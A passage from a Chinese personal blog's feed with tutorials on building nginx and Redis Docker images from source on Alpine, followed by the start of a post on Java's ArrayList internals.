    <id>http://fireflyingup.github.io/2022/06/21/dockerfile%E5%9F%BA%E4%BA%8Ealpine%E6%9E%84%E5%BB%BAnginx%E9%95%9C%E5%83%8F/</id>
    <published>2022-06-21T15:49:18.000Z</published>
    <updated>2022-06-24T06:52:32.990Z</updated>
    
    <content type="html"><![CDATA[<h2 id="坏境"><a href="#坏境" class="headerlink" title="坏境"></a>坏境</h2><p>docker：20.10.10</p><p>nginx：1.18.0</p><p>alpine：3.16.0</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>先创建一个空的文件夹，创建一个Dokcerfile文件，注意D大些，f小写。</p><p>准备nginx的源码包(<a href="https://nginx.org/download/nginx-1.18.0.tar.gz">版本直达</a>)，也可以去<a href="https://nginx.org/en/download.html">nginx官网</a>处自行下载对应的版本。</p><p>准备一个nginx.conf配置文件，里面主要包含了我们对nginx的一些配置，如下其中某些配置需要修改。</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">daemon off ;</span><br></pre></td></tr></table></figure><p>准备完之后文件里面内容如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">╰─$ ls -al</span><br><span class="line">total 2056</span><br><span class="line">drwxr-xr-x  6 guoying  staff      192 Jun 22 10:07 .</span><br><span class="line">drwxr-xr-x  7 guoying  staff      224 Jun 22 15:06 ..</span><br><span class="line">-rw-r--r--  1 guoying  staff     1219 Jun 20 23:25 Dockerfile</span><br><span class="line">drwxr-xr-x  7 guoying  staff      224 Jun 20 10:44 dist  <span class="comment"># 前端文件夹</span></span><br><span class="line">-rw-r--r--  1 guoying  staff  1039530 Apr 21  2020 nginx-1.18.0.tar.gz</span><br><span class="line">-rw-r--r--  1 guoying  staff     4820 Jun 20 22:44 nginx.conf <span class="comment">#里面需要个daemon off;</span></span><br></pre></td></tr></table></figure><h2 id="编写Dockerfile"><a href="#编写Dockerfile" class="headerlink" title="编写Dockerfile"></a>编写Dockerfile</h2><p>这里直接展示整个dockerfile文件，已经对应的注释</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># build nginx</span></span><br><span class="line"><span class="keyword">FROM</span> alpine:<span class="number">3.16</span>.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将源码包考入的镜像的根目录下</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> nginx-1.18.0.tar.gz /</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置aliyun仓库</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot;</span> &gt; /etc/apk/repositories &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">echo</span> <span class="string">&quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot;</span> &gt;&gt; /etc/apk/r epositories &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="comment"># 更新apk</span></span></span><br><span class="line">    apk update &amp;&amp; \</span><br><span class="line">    <span class="comment"># 安装必要依赖</span></span><br><span class="line">    apk <span class="keyword">add</span><span class="bash"> --no-cache --virtual .build-deps \</span></span><br><span class="line"><span class="bash">        gcc \</span></span><br><span class="line"><span class="bash">        libc-dev \</span></span><br><span class="line"><span class="bash">        make \</span></span><br><span class="line"><span class="bash">        openssl-dev \</span></span><br><span class="line"><span class="bash">        pcre-dev \</span></span><br><span class="line"><span class="bash">        zlib-dev \</span></span><br><span class="line"><span class="bash">        linux-headers \</span></span><br><span class="line"><span class="bash">        curl \</span></span><br><span class="line"><span class="bash">        gnupg \</span></span><br><span class="line"><span class="bash">        libxslt-dev \</span></span><br><span class="line"><span class="bash">        gd-dev \</span></span><br><span class="line"><span class="bash">        geoip-dev &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="comment"># 开始编译nginx</span></span></span><br><span class="line">    cd /nginx-<span class="number">1.18</span>.<span class="number">0</span> &amp;&amp; \</span><br><span class="line">    ./configure --prefix=/sca/nginx &amp;&amp; \</span><br><span class="line">    make &amp;&amp; make install &amp;&amp; \</span><br><span class="line">    <span class="comment"># 删除不需要的文件以及缓存</span></span><br><span class="line">    rm -rf nginx-<span class="number">1.18</span>.<span class="number">0</span>.tar.gz &amp;&amp; \</span><br><span class="line">    rm -rf nginx-<span class="number">1.18</span>.<span class="number">0</span> &amp;&amp; \</span><br><span class="line">    rm -rf /sca/nginx/html &amp;&amp; \</span><br><span class="line">    rm -rf /var/lib/apk/* &amp;&amp; \</span><br><span class="line">    rm -rf /tmp/* &amp;&amp; \</span><br><span class="line">    <span class="comment"># 移除apk的依赖</span></span><br><span class="line">    apk del .build-deps \</span><br><span class="line">        gcc \</span><br><span class="line">        pcre-dev \</span><br><span class="line">        libc-dev \</span><br><span class="line">        make \</span><br><span class="line">        openssl-dev \</span><br><span class="line">        zlib-dev \</span><br><span class="line">        linux-headers \</span><br><span class="line">        curl \</span><br><span class="line">        gnupg \</span><br><span class="line">        libxslt-dev \</span><br><span class="line">        gd-dev \</span><br><span class="line">        geoip-dev &amp;&amp; \</span><br><span class="line">    <span class="comment"># 重新安装运行时需要的依赖</span></span><br><span class="line">    apk <span class="keyword">add</span><span class="bash"> pcre-dev</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cp html file to container</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./dist /sca/nginx/html</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./nginx.conf /sca/nginx/conf/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴露80端口</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add run command </span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [ <span class="string">&quot;/sca/nginx/sbin/nginx&quot;</span> ]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h2><p>docker build -t fire-nginx:v1.0.0 .</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;坏境&quot;&gt;&lt;a href=&quot;#坏境&quot; class=&quot;headerlink&quot; title=&quot;坏境&quot;&gt;&lt;/a&gt;坏境&lt;/h2&gt;&lt;p&gt;docker：20.10.10&lt;/p&gt;
&lt;p&gt;nginx：1.18.0&lt;/p&gt;
&lt;p&gt;alpine：3.16.0&lt;/p&gt;
&lt;h2 id=&quot;准</summary>
      
    
    
    
    <category term="dockerfile" scheme="http://fireflyingup.github.io/categories/dockerfile/"/>
    
    
    <category term="nginx" scheme="http://fireflyingup.github.io/tags/nginx/"/>
    
    <category term="源码编译" scheme="http://fireflyingup.github.io/tags/%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"/>
    
    <category term="docker" scheme="http://fireflyingup.github.io/tags/docker/"/>
    
    <category term="alpine" scheme="http://fireflyingup.github.io/tags/alpine/"/>
    
    <category term="dockerfile" scheme="http://fireflyingup.github.io/tags/dockerfile/"/>
    
  </entry>
  
  <entry>
    <title>dockerfile基于alpine构建redis镜像</title>
    <link href="http://fireflyingup.github.io/2022/06/21/dockerfile%E5%9F%BA%E4%BA%8Ealpine%E6%9E%84%E5%BB%BAredis%E9%95%9C%E5%83%8F/"/>
    <id>http://fireflyingup.github.io/2022/06/21/dockerfile%E5%9F%BA%E4%BA%8Ealpine%E6%9E%84%E5%BB%BAredis%E9%95%9C%E5%83%8F/</id>
    <published>2022-06-21T15:49:13.000Z</published>
    <updated>2022-06-22T07:17:44.476Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一次自己通过dockerfile源码构建redis的血与泪，以及踩过的坑。</p><h2 id="坏境"><a href="#坏境" class="headerlink" title="坏境"></a>坏境</h2><p>docker：20.10.10</p><p>redis：5.0.14</p><p>alpine：3.16.0</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>先创建一个空的文件夹，创建一个Dokcerfile文件，注意D大些，f小写。</p><p>准备redis-5.0.14的源码包(<a href="https://download.redis.io/releases/redis-5.0.14.tar.gz">5.0.14版本直达</a>)，也可以去<a href="https://download.redis.io/releases/">所有版本</a>处自行下载对应的版本。</p><p>准备一个redis.conf配置文件，里面主要包含了我们对redis的一些配置，如下其中某些配置需要修改。</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">daemonize no</span><br></pre></td></tr></table></figure><p>准备完之后文件里面内容如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">╰─$ ls -alh</span><br><span class="line">total 4040</span><br><span class="line">drwxr-xr-x  5 guoying  staff   160B Jun 21 00:27 .</span><br><span class="line">drwxr-xr-x  7 guoying  staff   224B Jun 21 22:44 ..</span><br><span class="line">-rw-r--r--  1 guoying  staff   901B Jun 21 01:07 Dockerfile</span><br><span class="line">-rw-r--r--@ 1 guoying  staff   1.9M Jun 20 23:34 redis-5.0.14.tar.gz</span><br><span class="line">-rw-r--r--  1 guoying  staff    57K Jun 21 01:13 redis.conf</span><br></pre></td></tr></table></figure><h2 id="编写Dockerfile"><a href="#编写Dockerfile" class="headerlink" title="编写Dockerfile"></a>编写Dockerfile</h2><p>我们先想想整个dockerfile的步骤</p><p>1、首先得基于一个很小的系统（alpine）</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> alpine:<span class="number">3.16</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure><p>2、准备好需要的文件（redis源码包），可以在镜像里面下载（太慢）也可以自行拷贝进去，这里选择拷贝进去。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ADD</span><span class="bash"> redis-5.0.14.tar.gz /  <span class="comment"># 将同级目录的redis源码压缩包放入镜像中（压缩包会自行解压）</span></span></span><br></pre></td></tr></table></figure><p>3、配置apk的源</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot;</span> &gt; /etc/apk/repositories &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">echo</span> <span class="string">&quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot;</span> &gt;&gt; /etc/apk/r epositories</span></span><br></pre></td></tr></table></figure><p>4、安装需要的依赖</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> apk update &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apk add --no-cache --virtual .build-deps \ <span class="comment"># --no-cache表示不缓存</span></span></span><br><span class="line">    gcc \</span><br><span class="line">    g++ \</span><br><span class="line">    make \</span><br><span class="line">    libffi-dev \</span><br><span class="line">    openssl-dev </span><br><span class="line"><span class="comment"># redis还需要其他依赖，在redis的本地deps目录下面</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">cd</span> /redis-5.0.14/deps &amp;&amp; \</span></span><br><span class="line"><span class="bash">    make lua hiredis linenoise</span></span><br></pre></td></tr></table></figure><p>5、编译redis，指定编译的地址</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">cd</span> /redis-5.0.14 &amp;&amp; \</span></span><br><span class="line"><span class="bash">    make PREFIX=/sca/redis install</span></span><br></pre></td></tr></table></figure><p>6、删除编译时候需要运行时候不需要的依赖和多余文件</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> rm -rf /redis-5.0.14 &amp;&amp; \</span></span><br><span class="line"><span class="bash">    rm -rf /var/lib/apk/* &amp;&amp; \</span></span><br><span class="line"><span class="bash">    rm -rf /tmp/* &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apk del .build-deps \</span></span><br><span class="line"><span class="bash">    gcc \</span></span><br><span class="line"><span class="bash">    g++ \</span></span><br><span class="line"><span class="bash">    make \</span></span><br><span class="line"><span class="bash">    libffi-dev \</span></span><br><span class="line"><span class="bash">    openssl-dev</span></span><br></pre></td></tr></table></figure><p>7、替换配置文件 并且 暴露端口</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="bash"> ./redis.conf /sca/redis/</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">6379</span></span><br></pre></td></tr></table></figure><p>8、准备启动参数</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CMD</span><span class="bash"> [ <span class="string">&quot;/sca/redis/bin/redis-server&quot;</span>, <span class="string">&quot;/sca/redis/redis.conf&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>这样我们整个dockerfile的文件就如下所示</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> alpine:<span class="number">3.16</span>.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> redis-5.0.14.tar.gz /</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot;</span> &gt; /etc/apk/repositories &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">echo</span> <span class="string">&quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot;</span> &gt;&gt; /etc/apk/r epositories</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apk update &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apk add --no-cache --virtual .build-deps \</span></span><br><span class="line"><span class="bash">    gcc \</span></span><br><span class="line"><span class="bash">    g++ \</span></span><br><span class="line"><span class="bash">    make \</span></span><br><span class="line"><span class="bash">    libffi-dev \</span></span><br><span class="line"><span class="bash">    openssl-dev </span></span><br><span class="line"><span class="comment"># redis还需要其他依赖，在redis的本地deps目录下面</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">cd</span> /redis-5.0.14/deps &amp;&amp; \</span></span><br><span class="line"><span class="bash">    make lua hiredis linenoise</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">cd</span> /redis-5.0.14 &amp;&amp; \</span></span><br><span class="line"><span class="bash">    make PREFIX=/sca/redis install</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> rm -rf /redis-5.0.14 &amp;&amp; \</span></span><br><span class="line"><span class="bash">    rm -rf /var/lib/apk/* &amp;&amp; \</span></span><br><span class="line"><span class="bash">    rm -rf /tmp/* &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apk del .build-deps \</span></span><br><span class="line"><span class="bash">    gcc \</span></span><br><span class="line"><span class="bash">    g++ \</span></span><br><span class="line"><span class="bash">    make \</span></span><br><span class="line"><span class="bash">    libffi-dev \</span></span><br><span class="line"><span class="bash">    openssl-dev</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./redis.conf /sca/redis/</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">6379</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [ <span class="string">&quot;/sca/redis/bin/redis-server&quot;</span>, <span class="string">&quot;/sca/redis/redis.conf&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>接下来我们执行docker build -t fire-redis:v1.1.0 . ，等若干分钟之后</p><p><img src="/2022/06/21/dockerfile%E5%9F%BA%E4%BA%8Ealpine%E6%9E%84%E5%BB%BAredis%E9%95%9C%E5%83%8F/image-20220622144726727.png" alt="image-20220622144726727"></p><p>好家伙345MB，这谁受得了，我们可以使用docker history b3cf3ac45ad1 (这个是IMAGE ID)查看镜像的制造过程</p><p><img src="/2022/06/21/dockerfile%E5%9F%BA%E4%BA%8Ealpine%E6%9E%84%E5%BB%BAredis%E9%95%9C%E5%83%8F/image-20220622144948226.png" alt="image-20220622144948226"></p><p>接下来我们准备对镜像进行瘦身，最主要的一个过程就是对RUN 合并，dockerfile文件如下</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> alpine:<span class="number">3.16</span>.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> redis-5.0.14.tar.gz /</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot;</span> &gt; /etc/apk/repositories &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">echo</span> <span class="string">&quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot;</span> &gt;&gt; /etc/apk/r epositories &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apk update &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apk add --no-cache --virtual .build-deps \ </span></span><br><span class="line">    gcc \</span><br><span class="line">    g++ \</span><br><span class="line">    make \</span><br><span class="line">    libffi-dev \</span><br><span class="line">    openssl-dev &amp;&amp; \</span><br><span class="line">    cd /redis-<span class="number">5.0</span>.<span class="number">14</span>/deps &amp;&amp; \</span><br><span class="line">    make lua hiredis linenoise &amp;&amp; \</span><br><span class="line">    cd /redis-<span class="number">5.0</span>.<span class="number">14</span> &amp;&amp; \</span><br><span class="line">    make PREFIX=/sca/redis install &amp;&amp; \</span><br><span class="line">    rm -rf /redis-<span class="number">5.0</span>.<span class="number">14</span> &amp;&amp; \</span><br><span class="line">    rm -rf /var/lib/apk/* &amp;&amp; \</span><br><span class="line">    rm -rf /tmp/* &amp;&amp; \</span><br><span class="line">    apk del .build-deps \</span><br><span class="line">    gcc \</span><br><span class="line">    g++ \</span><br><span class="line">    make \</span><br><span class="line">    libffi-dev \</span><br><span class="line">    openssl-dev</span><br><span class="line">    </span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./redis.conf /sca/redis/</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">6379</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [ <span class="string">&quot;/sca/redis/bin/redis-server&quot;</span>, <span class="string">&quot;/sca/redis/redis.conf&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>可以看到大小有很大的缩减</p><p><img src="/2022/06/21/dockerfile%E5%9F%BA%E4%BA%8Ealpine%E6%9E%84%E5%BB%BAredis%E9%95%9C%E5%83%8F/image-20220622145228819-5880765.png" alt="image-20220622145228819"></p><p>这样子我们就已经制作好了一个redis的镜像，此时使用docker run -d -p 6379:6379 fire-redis:v1.1.1启动容器</p><p><img src="/2022/06/21/dockerfile%E5%9F%BA%E4%BA%8Ealpine%E6%9E%84%E5%BB%BAredis%E9%95%9C%E5%83%8F/image-20220622145552217.png" alt="image-20220622145552217"></p><h2 id="常见错误"><a href="#常见错误" class="headerlink" title="常见错误"></a>常见错误</h2><p>错误1:no such file or directory</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">╰─$ docker build -t fire-nginx:v1.1.0 .                                                                                                                                                                                                                                     1 ↵</span><br><span class="line">[+] Building 0.1s (1/2)</span><br><span class="line"> =&gt; [internal] load build definition from Dockerfile                                  0.0s</span><br><span class="line"> =&gt; =&gt; transferring dockerfile: 2B                                                    0.0s</span><br><span class="line">failed to solve with frontend dockerfile.v0: failed to <span class="built_in">read</span> dockerfile: open /var/lib/docker/tmp/buildkit-mount956713246/Dockerfile: no such file or directory</span><br></pre></td></tr></table></figure><p>解决：Dockerfile写成了DockerFile，注意f小写。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/Struggle99/article/details/124684534">https://blog.csdn.net/Struggle99/article/details/124684534</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;记录一次自己通过dockerfile源码构建redis的血与泪，以及踩过的坑。&lt;/p&gt;
&lt;h2 id=&quot;坏境&quot;&gt;&lt;a href=&quot;#坏境&quot; </summary>
      
    
    
    
    <category term="dockerfile" scheme="http://fireflyingup.github.io/categories/dockerfile/"/>
    
    
    <category term="源码编译" scheme="http://fireflyingup.github.io/tags/%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/"/>
    
    <category term="redis" scheme="http://fireflyingup.github.io/tags/redis/"/>
    
    <category term="docker" scheme="http://fireflyingup.github.io/tags/docker/"/>
    
    <category term="alpine" scheme="http://fireflyingup.github.io/tags/alpine/"/>
    
    <category term="dockerfile" scheme="http://fireflyingup.github.io/tags/dockerfile/"/>
    
  </entry>
  
  <entry>
    <title>Java集合</title>
    <link href="http://fireflyingup.github.io/2022/04/21/%E9%9B%86%E5%90%88/"/>
    <id>http://fireflyingup.github.io/2022/04/21/%E9%9B%86%E5%90%88/</id>
    <published>2022-04-21T02:40:20.000Z</published>
    <updated>2023-12-19T01:29:46.956Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Collection"><a href="#Collection" class="headerlink" title="Collection"></a>Collection</h2><h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><h4 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h4><p>ArrayList是一个Object数组实现的数据结构，线程不安全</p><p>默认初始化大小10</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Default initial capacity.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEFAULT_CAPACITY = <span class="number">10</span>;</span><br></pre></td></tr></table></figure><p>add方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(E e, Object[] elementData, <span class="keyword">int</span> s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s == elementData.length) <span class="comment">// 当下标的长度等于数组长度时候 扩容</span></span><br><span class="line">        elementData = grow(); <span class="comment">// 返回扩容后的数组</span></span><br><span class="line">    elementData[s] = e;</span><br><span class="line">    size = s + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 在父类AbstractList中定义，表示被修改的次数，一般与iterator一起使用，</span></span><br><span class="line">  <span class="comment">// 当modCount与expectCount不一致时，抛出ConcurrentModificationException异常</span></span><br><span class="line">    modCount++;</span><br><span class="line">    add(e, elementData, size);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E element)</span> </span>&#123;</span><br><span class="line">    rangeCheckForAdd(index); <span class="comment">// 判断下标的合法性 index&gt;0 &amp;&amp; index &lt;= size</span></span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> s;</span><br><span class="line">    Object[] elementData;</span><br><span class="line">    <span class="keyword">if</span> ((s = size) == (elementData = <span class="keyword">this</span>.elementData).length)</span><br><span class="line">        elementData = grow(); <span class="comment">// 扩容操作</span></span><br><span class="line">    System.arraycopy(elementData, index,</span><br><span class="line">                     elementData, index + <span class="number">1</span>,</span><br><span class="line">                     s - index); <span class="comment">// 使用System.arraycopy分配一个新的数组地址，然后降旧的数据拷贝过来</span></span><br><span class="line">    elementData[index] = element;</span><br><span class="line">    size = s + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>grow方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span 